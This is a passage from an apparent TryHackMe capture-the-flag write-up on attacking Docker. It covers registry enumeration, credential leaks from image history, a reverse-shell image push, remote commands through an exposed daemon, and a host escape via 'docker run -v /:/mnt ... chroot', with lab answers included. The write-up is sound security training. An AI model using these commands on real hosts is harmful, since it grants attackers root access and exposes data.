<code>docker pull rustscan/rustscan:latest</code> for the most recent update. For a Docker repository to do this, the repository must store the data about every tag - this is what we&#x27;ll be exploiting.</p><p>Since Docker images are essentially just instruction manuals as we discussed earlier, they can be reversed to understand what commands took place when the image was being built - this information is stored in layers...We will come onto unpacking these layers in Task 4.</p><p>I&#x27;ve learnt about Docker registries</p><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-5-32-interacting-with-a-docker-registry">Task 5 3.2. Interacting with a Docker Registry<a href="#task-5-32-interacting-with-a-docker-registry" class="hash-link" aria-label="Direct link to Task 5 3.2. Interacting with a Docker Registry" title="Direct link to Task 5 3.2. Interacting with a Docker Registry">​</a></h2><p>As with any system that we are going to be penetration testing, we need to enumerate the services running to understand any potential entry points. In our case, Docker Registry runs on port 5000 by default, however, this can be easily changed, so it is worth confirming via with a nmap scan like so: <code>sudo nmap -sV MACHINE_IP</code></p><p><img loading="lazy" src="https://i.imgur.com/rz4orgs.png" class="img_ev3q"></p><p>Not only is Nmap capable of discovering the Docker Registry, but also the API version - this is important to note for how we will interact with it.</p><p>The Docker Registry is a JSON endpoint, so we cannot just simply interact with it like we would a normal website - we will have to query it. Whilst this can be done via the terminal or browser, dedicated tools such as <a href="https://www.postman.com/downloads/" target="_blank" rel="noopener noreferrer">Postman</a> or <a href="https://insomnia.rest/download/" target="_blank" rel="noopener noreferrer">Insomnia</a> are much better suited for the job. I will be using Postman in this room.</p><p>To understand what routes are available to us, we need to read the <a href="https://docs.docker.com/registry/spec/api/" target="_blank" rel="noopener noreferrer">Docker Registry Documentation</a>. Please take the time to read this at your leisure.</p><p><strong>3.2.1. Discovering Repositories</strong></p><p>We need to send a <code>GET</code> request to <code>http://docker-rodeo.thm:5000/v2/_catalog</code> to list all the repositories registered on the registry.</p><p><img loading="lazy" src="https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/dockerregistry/catalog1.png" class="img_ev3q"></p><p>In this example, we&#x27;re given a response of three repositories. For now, we are only going to focus on &quot;cmnatic/myapp1&quot;.</p><p>Before we can begin analysing a repository, we need two key pieces of information: </p><ol><li>The repository name</li><li>Any repository tag(s) published</li></ol><p>We currently have the repository name (cmnatic/myapp1) now we just need to list all tags that have been published. Every repository will have a minimum of one tag. This tag is the &quot;latest&quot; tag, but there can be many tags, all with different code, for example, major software versions or two tags for &quot;production&quot; and &quot;development&quot;.</p><p>Send a <code>GET</code> request to <code>http://docker-rodeo.thm:5000/v2/repository/name/tags/list</code> to query all published tags. For our application, our request would look like so: <code>http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/tags/list</code>:</p><p><img loading="lazy" src="https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/dockerregistry/listingtags.png" class="img_ev3q"></p><p>Note here we have three tags? That &quot;notsecure&quot; tag sure sounds interesting. We now have both pieces of information to retrieve the manifest files of the image for analysis.</p><p><strong>3.2.2. Grabbing the Data!</strong></p><p>With these two important pieces of information about a repository known, we can enumerate that specific repository for a manifest file. This manifest file contains various pieces of information about the application, such as size, layers and other information. I&#x27;m going to grab the manifest file for the &quot;notsecure&quot; tag via the following GET request: <a href="http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/manifests/notsecure" target="_blank" rel="noopener noreferrer">http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/manifests/notsecure</a></p><p>Note the response - specifically the &quot;history&quot; key;  albeit slightly hard to read, we have a command that was executed during the image building stage stored in plaintext (echo <!-- -->\<!-- -->\&quot;here&#x27;s a flag<!-- -->\<!-- -->\&quot; <!-- -->\<!-- -->u003e /root/root.txt\&quot;]` ). In this image, it&#x27;s a string insert into /root/root.txt on the container. Although imagine if this was a password!</p><p><img loading="lazy" src="https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/dockerregistry/manifest1.png" class="img_ev3q"></p><p><strong>3.2.3. Now it&#x27;s Your Turn...</strong></p><p>Apply what we have done above, enumerate the 2nd Docker registry running on the Instance, find out what repositories are stored within it and ultimately extract some credentials for a database.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">stroke@stroke:~$ sudo nmap -A -sS -sC -sV docker-rodeo.thm</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[sudo] Passwort für stroke: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-30 16:43 CET</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap scan report for docker-rodeo.thm (10.10.13.136)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host is up (0.081s latency).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Not shown: 997 closed ports</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PORT     STATE SERVICE VERSION</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssh-hostkey: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   2048 fd:d0:39:ac:06:08:f2:8f:c3:01:bc:53:94:a3:81:dd (RSA)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   256 36:62:4b:1f:9b:3c:6f:22:cc:a9:3a:ae:98:7a:3e:d3 (ECDSA)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  256 f2:cb:82:b5:ba:e6:f0:86:cd:b5:30:61:e4:d3:ca:96 (ED25519)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">5000/tcp open  http    Docker Registry (API: 2.0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-title: Site doesn&#x27;t have a title.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">7000/tcp open  http    Docker Registry (API: 2.0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-title: Site doesn&#x27;t have a title.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">TCP/IP fingerprint:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">OS:SCAN(V=7.80%E=4%D=11/30%OT=22%CT=1%CU=36016%PV=Y%DS=2%DC=T%G=Y%TM=5FC513</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">OS:74%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">OS:(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">OS:1NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">OS:(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">OS:=S)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Network Distance: 2 hops</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">TRACEROUTE (using port 1025/tcp)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HOP RTT      ADDRESS</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">1   48.88 ms 10.11.0.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2   48.94 ms docker-rodeo.thm (10.10.13.136)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap done: 1 IP address (1 host up) scanned in 56.75 seconds</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>What is the port number of the 2nd Docker registry?</p><p><code>7000</code></p><p>What is the name of the repository within this registry?</p><p><code>securesolutions/webserver</code></p><p>What is the name of the tag that has been published?</p><p><code>production</code></p><p>What is the Username in the database configuration?</p><p><code>admin</code></p><p>What is the Password in the database configuration?</p><p><code>production_admin</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-6-4-vulnerability-2-reverse-engineering-docker-images">Task 6 4. Vulnerability #2: Reverse Engineering Docker Images<a href="#task-6-4-vulnerability-2-reverse-engineering-docker-images" class="hash-link" aria-label="Direct link to Task 6 4. Vulnerability #2: Reverse Engineering Docker Images" title="Direct link to Task 6 4. Vulnerability #2: Reverse Engineering Docker Images">​</a></h2><p>We&#x27;ll be following on from the previous vulnerability outlined in Task 3. &quot;Abusing a Docker Registry&quot;.</p><p>As we&#x27;ve discovered, we are able to query the Docker registry and the data contained within without needing to authenticate. </p><p>Not only can we query Docker registries, but a fundamental feature of Docker is being able to download these repositories for someone to use themselves. This is known as an image; tools such as <a href="https://github.com/wagoodman/dive" target="_blank" rel="noopener noreferrer">Dive</a> to reverse engineer these images that we download.</p><p>Without doing it justice, Dive acts as a man-in-the-middle between ourselves and Docker when we use it to run a container. <a href="https://github.com/wagoodman/dive" target="_blank" rel="noopener noreferrer">Dive</a> monitors and reassembles how each layer is created and the containers file system at each stage.</p><p>We&#x27;ll start off with an example. Let&#x27;s download a Docker image from our vulnerable repository and starting diving in. </p><p>4.1. <a href="https://github.com/wagoodman/dive#installation" target="_blank" rel="noopener noreferrer">Install Dive</a> from their official GitHub</p><p>4.2. Download the Docker image we are going to decompile using <code>docker pull docker-rodeo.thm:5000/dive/example</code></p><p>Note: If you receive this warning:</p><blockquote><p>Error response from daemon: Get <a href="https://docker-rodeo.thm:5000/v2/" target="_blank" rel="noopener noreferrer">https://docker-rodeo.thm:5000/v2/</a>: http: server gave HTTP response to HTTPS client</p></blockquote><p>you need to revisit Step 1 in the first task of this room and then restart your Computer to ensure Docker has properly restarted.</p><p>4.3. Find the <strong>IMAGE_ID</strong> of the repository image that we have downloaded in <strong>Step 2</strong>:</p><p>4.3.1. run docker images and look for the name of the repository we downloaded docker-rodeo.thm:5000/dive/example</p><p>4.3.2. The &quot;IMAGE_ID&quot; is the value in the third column:</p><p><img loading="lazy" src="https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/reversedockerimages/diveexample-id.png" class="img_ev3q"></p><p>In this case, it is &quot;398736241322&quot; for me.</p><p>4.4 Start dive by running dive and provide the &quot;IMAGE_ID&quot; of the image we want to decompile. For example: dive 398736241322</p><p><img loading="lazy" src="https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/reversedockerimages/using-dive.png" class="img_ev3q"></p><p><strong>4.5. Using Dive</strong></p><p>Dive is a little overwhelming at first, however, it quickly makes sense. We have four different views, we are only interested in these three views:</p><p>4.5.1. Layers (pictured in red)
4.5.1.1. This window shows the various layers and stages the docker container has gone through</p><p>4.6.1. Current Layer Contents (pictured in green)
4.6.1.1. This window shows you the contents of the container&#x27;s filesystem at the selected layer</p><p>4.7.1. Layer Details (pictured in red)
4.7.1.1. Shows miscellaneous information such as the ID of the layer and any command executed in the Dockerfile for that layer.</p><p><img loading="lazy" src="https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/reversedockerimages/using-dive2.png" class="img_ev3q"></p><p>Navigate the data within the current window using the &quot;Up&quot; and &quot;Down&quot; Arrow-keys.
You can swap between the Windows using the &quot;Tab&quot; key.</p><p><strong>4.8. Disassembling Our First Image in Dive</strong></p><p>Looking at the &quot;Layers&quot; window in the top-left, we can see a total of 7 individual layers</p><p><img loading="lazy" src="https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/reversedockerimages/using-dive3.png" class="img_ev3q"></p><p>Note how we can see the commands executed by the container when the image is being built in the &quot;Layers&quot; panel.</p><p>For example, take a look at the first layer then press the &quot;Tab&quot; key to switch windows and scroll down (using the arrow keys) to the &quot;home&quot; directory in &quot;Current Layer Contents&quot; and then press the &quot;Tab&quot; key again to switch back to the &quot;Layers&quot; window.</p><p><img loading="lazy" src="https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/reversedockerimages/using-dive4.png" class="img_ev3q"></p><p>At the 1st layer, there is nothing located in &quot;/home&quot; (highlighted in green in the above screenshot) on the container. However, if we were to proceed to the 2nd layer, the command <code>mkdir -p /home/user</code> is executed, and now we can see the directory &quot;/home/user&quot; (highlighted in red) has now been made on the container.</p><p><img loading="lazy" src="https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/reversedockerimages/using-dive5.png" class="img_ev3q"></p><p><strong>4.9. Challenge</strong></p><p>Pull the challenge image using <code>docker pull docker-rodeo.thm:5000/dive/challenge</code> and apply what we have done above for the questions below.</p><p>Remember! You will need to use <code>docker images</code> to get the &quot;IMAGE_ID&quot; for the new image and use that with the <code>dive</code> command.</p><p>What is the &quot;IMAGE_ID&quot; for the &quot;challenge&quot; Docker image that you just downloaded?</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">stroke@stroke:~$ sudo docker images</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">REPOSITORY                             TAG                 IMAGE ID            CREATED             SIZE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">docker-rodeo.thm:5000/dive/challenge   latest              2a0a63ea5d88        5 weeks ago         111MB</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>2a0a63ea5d88</code></p><p>Using Dive, how many &quot;Layers&quot; are there in this image?</p><p><code>7</code></p><p>What user is successfully added?</p><p><code>uogctf</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-7-5-vulnerability-3-uploading-malicious-docker-images">Task 7 5. Vulnerability #3: Uploading Malicious Docker Images<a href="#task-7-5-vulnerability-3-uploading-malicious-docker-images" class="hash-link" aria-label="Direct link to Task 7 5. Vulnerability #3: Uploading Malicious Docker Images" title="Direct link to Task 7 5. Vulnerability #3: Uploading Malicious Docker Images">​</a></h2><p>Continuing with exploiting the vulnerable Docker Registry from Task 3. &quot;Abusing a Docker Registry&quot;, we can upload (or <code>push</code>) our own images to a repository, containing malicious code. Repositories can have as little or as many tags as the owners wish. However, every repository is guaranteed to have a &quot;latest&quot; tag. This tag is a copy of the latest upload of an image.</p><p>When a <code>docker pull</code> or <code>docker run</code> command is issued, Docker will first try to find a copy of the image (i.e. cmnatic/myapp1) on the host and then proceed to check if there have been any changes made on the Docker registry it was pulled from. If there are changes, Docker will download the updated image onto the host and then proceed to execute.</p><p>Without proper authentication, we can upload our own image to the target&#x27;s registry. That way, the next time the owner runs a <code>docker pull</code> or <code>docker run</code> command, their host will download and execute our malicious image as it will be a new version for Docker.</p><p>The screenshot below is a &quot;Dockerfile&quot; that uses the Docker <code>RUN</code> instruction to execute &quot;netcat&quot; within the container to connect to our machine! </p><p><img loading="lazy" src="https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/malicious/reverseshell1.png" class="img_ev3q"></p><p>We compile this into an image with <code>docker build</code> . Once compiled and added to the vulnerable registry, we set up a listener on our attacker machine and wait for the new image to be executed by the target.</p><p><img loading="lazy" src="https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/malicious/reverseshell2.png" class="img_ev3q"></p><p>Note this will only grant us root access to the container using the image, and not the actual host - but it&#x27;s a connection as root nonetheless. We can start to use these newly gained root privileges to look for configuration files, passwords or attempt to escape!</p><p>Additional reading: <a href="https://www.trendmicro.com/vinfo/us/security/news/virtualization-and-cloud/malicious-docker-hub-container-images-cryptocurrency-mining" target="_blank" rel="noopener noreferrer">A Malicious DockerHub Image allowed attackers mine cryptocurrency</a></p><p>Note that there is no practical element to this task by design.</p><p>I&#x27;ve learnt that we can publish images with malicious code such as reverse shells to our vulnerable Docker registry.</p><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-8-6-vulnerability-4-rce-via-exposed-docker-daemon">Task 8 6. Vulnerability #4: RCE via Exposed Docker Daemon<a href="#task-8-6-vulnerability-4-rce-via-exposed-docker-daemon" class="hash-link" aria-label="Direct link to Task 8 6. Vulnerability #4: RCE via Exposed Docker Daemon" title="Direct link to Task 8 6. Vulnerability #4: RCE via Exposed Docker Daemon">​</a></h2><p><strong>6.1. Unix Sockets 101 (no travel adapter required)</strong></p><p>If I were to mention the word &quot;socket&quot; you would most likely think of networking, right? Well, you&#x27;re not wrong in doing so. With that said, what is often seldom discussed is UNIX sockets...Put simply, a UNIX socket accomplishes the same job as it&#x27;s networking sibling - moving data, albeit all within the host itself by using the filesystem rather than networking interfaces/adapters; Interprocess Communication (IPC) is an essential part to an operating system. Due to the fact that UNIX sockets use the filesystem directly, you can use filesystem permissions to decide who or what can read/write.</p><p>There was an interesting <a href="https://www.percona.com/blog/2020/04/13/need-to-connect-to-a-local-mysql-server-use-unix-domain-socket/" target="_blank" rel="noopener noreferrer">benchmark test</a> between using both types of sockets for querying a MySQL database. Notice in the screenshot below how there are an incredibly higher amount of queries performed when using UNIX sockets; database systems such as Redis are known for their performance due to this reason.</p><p><img loading="lazy" src="https://www.percona.com/blog/wp-content/uploads/2020/04/image2-2.png" class="img_ev3q">
(Percona., 2020)</p><p><strong>6.2. How does this pertain to Docker?</strong></p><p>Users interact with Docker by using the Docker Engine. For example, commands such as <strong>docker pull</strong> or <strong>docker run</strong> will be executed by the use of a socket - this can either be a UNIX or a TCP socket, but by default, it is a UNIX socket. This is why you must be apart of the &quot;docker&quot; group to use the docker command (remembering that UNIX sockets can use file permissions here!) as illustrated below:</p><p>The user &quot;<strong>cmnatic</strong>&quot; is in the &quot;<strong>docker</strong>&quot; group</p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/dockerapi/groups1.png" class="img_ev3q"></p><p>And can therefore run commands like <code>docker images</code></p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/dockerapi/groups2.png" class="img_ev3q"></p><p>Whereas, the user &quot;notcmnatic&quot; is not in the &quot;docker&quot; group and cannot run Docker commands due to lack of permissions to the Docker socket.</p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/dockerapi/groups4.png" class="img_ev3q"></p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/dockerapi/groups3.png" class="img_ev3q"></p><p><strong>6.3. Automating all the things</strong></p><p>Developers love to automate, and this is proven nonetheless with Docker. Whilst Docker uses a UNIX socket, meaning that it can only interact from the host itself. However, someone may wish to remotely execute Docker commands such as in Docker management tools like Portainer or DevOps applications like Jenkins to test their program.</p><p>To achieve this, the daemon must use a TCP socket instead, permitting data for the Docker daemon to be communicated using the network interface and ultimately exposing it to the network for us to exploit.</p><p><strong>6.4. Practical:</strong></p><p><strong>6.4.1. Enumerate, enumerate, enumerate...</strong></p><p>We&#x27;ll need to enumerate the host to look for this exposed service. By default, the engine will run on port 2375 - let&#x27;s confirm this by performing another Nmap scan against your Instance (MACHINE_IP).</p><p>Please note that you may need to upgrade your version of Nmap (or proceed to &quot;Step 2&quot;) if this port does not appear in your Nmap scan.</p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/dockerapi/nmap1.png" class="img_ev3q"></p><p><strong>6.4.2. Confirming vulnerability.</strong></p><p>Great! Looks like it&#x27;s open, we&#x27;re going to use the curl command to start interacting with the exposed Docker daemon.</p><p>Confirming that we can access the Docker daemon:</p><p><code>curl http://10.10.13.136:2375/version</code></p><p>And note that we receive a response will all sorts of data about the host - lovely!</p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/dockerapi/curl1.png" class="img_ev3q"></p><p><strong>6.4.3. Execute</strong></p><p>We&#x27;ll perform our first Docker command by using the &quot;-H&quot; switch to specify the Instance to list the containers running <code>docker -H tcp://10.10.13.136:2375 ps</code></p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/dockerapi/docker1.png" class="img_ev3q"></p><p><strong>6.4.4. Experiment</strong></p><p>Of course, listing the running containers is the least that we can do at this stage. We can start to create our own, extract their filesystems and look for data, or execute commands on the host itself. Here are a few docker commands that I&#x27;ll leave for you to experiment with:</p><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td>network ls</td><td>Used to list the networks of containers, we could use this to discover other applications running and pivot to them from our machine!</td></tr><tr><td>images</td><td>List images used by containers, data can also be exfiltrated by reverse-engineering the image.</td></tr><tr><td>exec</td><td>Execute a command on a container</td></tr><tr><td>run</td><td>Run a container</td></tr></tbody></table><p>Experiment with some <a href="https://raw.githubusercontent.com/sangam14/dockercheatsheets/master/dockercheatsheet8.png" target="_blank" rel="noopener noreferrer">Docker commands</a> to enumerate the machine, try to gain a shell onto some of the containers and take a look at using tools such as <a href="https://registry.hub.docker.com/r/chrisfosterelli/rootplease" target="_blank" rel="noopener noreferrer">rootplease</a> to use Docker to create a root shell on the device itself.</p><p>I&#x27;ve executed some Docker commands remotely on the vulnerable Instance</p><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-9-7-vulnerability-5-escape-via-exposed-docker-daemon">Task 9 7. Vulnerability #5: Escape via Exposed Docker Daemon<a href="#task-9-7-vulnerability-5-escape-via-exposed-docker-daemon" class="hash-link" aria-label="Direct link to Task 9 7. Vulnerability #5: Escape via Exposed Docker Daemon" title="Direct link to Task 9 7. Vulnerability #5: Escape via Exposed Docker Daemon">​</a></h2><p>For this task, we&#x27;re going to assume that we have managed to gain a foothold onto the container from something such as a vulnerable website running in a container.</p><p>7.1. Step 1. Connecting to the container:</p><p>Connect to your Instance using SSH with the following details:</p><ul><li>IP: MACHINE_IP</li><li>SSH Port: 2233</li><li>Username: danny</li><li>Password: danny</li></ul><p><strong>7.2. Looking for the exposed Docker socket</strong></p><p>Armed with the knowledge we&#x27;ve learnt about the Docker socket in &quot;Vulnerability #4: RCE via Exposed Docker Daemon&quot;, we can look for exposure of this file within the container, and confirm whether or not the current user has permissions to run docker commands with <code>groups</code>.</p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/container-socket/container-sock1.png" class="img_ev3q"></p><p><strong>7.3. Mount host volumes</strong></p><p>In the instance of this room, I have already downloaded the &quot;alpine&quot; image to the container that you are exploiting. In a THM room, you will most likely have to upload this image to the container before you can execute it, as Instances do not deploy with an internet connection.</p><p>Now that we&#x27;ve confirmed we can execute Docker commands, let&#x27;s mount the host directory to a new container and then connect to that to reveal all the data on the host OS! d<code>ocker run -v /:/mnt --rm -it alpine chroot /mnt sh</code></p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/container-socket/container-sock2.png" class="img_ev3q"></p><p>Note: If you do not receive any output after 30 seconds you will need to cancel the command by &quot;Ctrl + C&quot; and attempt to run it again.</p><p>We are essentially mounting the hosts &quot;/&quot; directory to the &quot;/mnt&quot; dir in a new container, chrooting and then connecting via a shell.</p><p>7.4. Verify loot
Success! We have a shell, let&#x27;s verify who we&#x27;re now connected as and enumerate around the file system.</p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/container-socket/container-sock3.png" class="img_ev3q"></p><p>Escape Successful</p><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-10-8-vulnerability-6-shared-namespaces">Task 10 8. Vulnerability #6: Shared Namespaces<a href="#task-10-8-vulnerability-6-shared-namespaces" class="hash-link" aria-label="Direct link to Task 10 8. Vulnerability #6: Shared Namespaces" title="Direct link to Task 10 8. Vulnerability #6: Shared Namespaces">​</a></h2><p><strong>8.1. Let&#x27;s backpedal a little bit...</strong></p><p>I purposefully waited until this stage to show you exactly how Docker &quot;isolates&quot; containers from one another. Let&#x27;s bring back our trusty diagram that demonstrates how containers run on the operating system.</p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/namespaces/docker-containers.png" class="img_ev3q"></p><p>As you would have discovered during this room,  containers have networking capabilities and their own file storage...I mean we have previously used SSH to connect to the container into them and there were files present! They achieve this by using three components of the Linux kernel:</p><ul><li>Namespaces</li><li>Cgroups</li><li>OverlayFS</li></ul><p>But we&#x27;re only going to be interested in namespaces here, after all, they lay at the heart of it. Namespaces essentially segregate system resources such as processes, files and memory away from other namespaces.</p><p>Every process running on Linux will be assigned two things:</p><ul><li>A namespace</li><li>A process identifier (PID)</li></ul><p>Namespaces are how containerization is achieved! Processes can only &quot;see&quot; the process that is in the same namespace - no conflicts in theory. Take Docker for example, every new container will be running as a new namespace, although the container may be running multiple applications (and in turn, processes).</p><p>Let&#x27;s prove the concept of containerisation by comparing the number of processes there are in a Docker container that is running a webserver versus host operating system at the time:</p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/namespaces/ps1.png" class="img_ev3q"></p><p>Note some useful information highlighted in red. On the very left we can see system user the process is running as then the processes number. There are a few more columns that aren&#x27;t worth explaining for this task. But notice in the last column, the command that is running. I&#x27;ve highlighted a Docker command running, and an instance of Google Chrome running. You can see I have a considerable amount of processes running.</p><p>Let&#x27;s list the processes running in our Docker container using <code>ps aux</code> It&#x27;s important to note that we only have 6 processes running. This difference is a great indicator that we&#x27;re in a container.</p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/namespaces/ps2.png" class="img_ev3q"></p><p><strong>8.2. Here&#x27;s why it matters to us:</strong></p><p>Put simply, the process with an ID of 0 is the process that is started when the system boots. Processes numbers increment and must be started by another process, so naturally, the next process ID will be #1. This process is the systems init , for example, the latest versions of Ubuntu use systemd. Any other process that runs will be controlled by systemd (process #1).</p><p>We can use process #1&#x27;s namespace on an operating system to escalate our privileges. Whilst containers are designed to use these namespaces to isolate from another, they can instead, coincide with the host computers processes, rather than isolated from...this gives us a nice opportunity to escape!</p><p><strong>8.3. Getting started</strong></p><p>This vulnerability generally relies on having root permissions to the container already so that the container is exposed to namespaces on the host. </p><p>Connect to your Instance using SSH with the following details:</p><ul><li>New Instance IP: MACHINE_IP</li><li>SSH Port: 2244</li><li>Username: root</li><li>Password: danny</li></ul><p><strong>8.4. Our exploit here is simple...</strong></p><p>We can confirm that the container we&#x27;re connected to in namespaces of the host by using <code>ps aux</code>. Remember how we were only expecting a couple of entries? Now we can see the whole systems process...</p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/namespaces/esc1.png" class="img_ev3q"></p><p>The exploit here is actually rather trivial, but I&#x27;ll digress 